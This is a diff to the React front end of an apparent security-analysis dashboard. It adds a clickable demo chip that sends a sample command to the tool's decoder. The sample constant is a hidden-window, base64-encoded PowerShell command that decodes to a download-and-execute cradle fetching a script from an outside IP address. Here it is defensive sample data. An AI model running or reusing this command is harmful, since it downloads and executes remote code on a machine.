@@ -1,6 +1,7 @@
 import { lazy, Suspense, useEffect, useRef, useState } from 'react'
 import type { ReactNode } from 'react'
 import { cx } from '@socdesk/shared/lib/cx'
+import { Chip } from '@socdesk/shared/ui'
 import { MicroLabel } from '../components/ui'
 import { SituationalBoard } from '../components/overview'
 import { useEffectiveTheme, type CompareResult } from '@socdesk/shared/verdict-cards'
@@ -30,8 +31,25 @@ const GlobeStage3 = lazy(() =>
 
 const DEMO_INDICATORS = ['185.220.101.34', '1.1.1.1', '8.8.8.8']
 
+// One sample COMMAND alongside the indicator chips (external UX review §4) —
+// the Analyzer tab is gone from top nav (App.tsx, nav:false), so this is the
+// only on-page hint that the omnibox also takes a pasted command, not just an
+// indicator. `-nop -w hidden -enc <base64>` is a classic encoded-launch
+// shape: COMMAND_TOKEN_RE/ENC_FLAG_RE (shared/intent.ts) classify it as
+// 'command' before it ever reaches detectType, so clicking it always docks
+// the analyzer result, never an /api/enrich lookup. The payload decodes
+// (Base64 -> UTF-16LE) to a WebClient download-string cradle so the demo
+// actually shows a decode ladder + an extracted IP/URL, not an empty result.
+const DEMO_COMMAND =
+  'powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AMQA1ADUALgAyADAANQAuADcALwB1AHAAZABhAHQAZQAuAHAAcwAxACcAKQA='
+
 const CHIP_CLS =
   'rounded-md border border-line bg-panel px-2.5 py-1 font-mono text-xs text-muted transition-colors duration-150 ease-brand hover:border-line-bright hover:text-paper focus-visible:outline-2 focus-visible:outline-accent'
+
+const COMMAND_CHIP_CLS = cx(
+  'inline-flex items-center gap-1.5',
+  CHIP_CLS,
+)
 
 // Standard enter used for the card reveal + the compact result brand line.
 const REVEAL_CLS =
@@ -240,6 +258,17 @@ export function Overview({
                   {v}
                 </button>
               ))}
+              <button
+                type="button"
+                onClick={() => flyDemo(DEMO_COMMAND)}
+                aria-label="Try a sample PowerShell command — decodes and extracts IOCs inline"
+                className={COMMAND_CHIP_CLS}
+              >
+                <Chip variant="catalog" className="px-1.5 py-0">
+                  PowerShell
+                </Chip>
+                <span>sample -enc payload</span>
+              </button>
             </div>
           )}
         </div>
